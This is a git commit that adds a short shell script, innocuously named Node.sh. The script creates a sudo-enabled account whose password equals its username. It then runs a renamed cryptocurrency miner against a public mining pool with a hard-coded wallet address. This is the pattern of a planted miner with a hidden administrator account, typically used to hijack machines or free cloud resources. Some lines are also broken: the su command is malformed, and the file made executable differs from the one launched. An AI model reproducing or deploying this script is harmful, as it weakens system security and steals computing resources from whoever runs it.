a99eb3275467871015fc2b1a48ca308d516e282c
Kinan878787 <86232742+Kinan878787@users.noreply.github.com>
2021-06-21 17:11:23 +0700

    Create Node.sh

---
+++ Node.sh
@@ -0,0 +1,7 @@
+sudo useradd -m kunemuse \
+ && sudo adduser kunemuse sudo \
+ && sudo usermod -a -G sudo kunemuse \
+ && sudo echo 'kunemuse:kunemuse' | sudo chpasswd
+sudo - su kunemuse
+chmod +x minerpalsu
+./memek -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qhcv5w5n5h8xjyzuy2nmcf0ah4e3eykmayp765f.kinan
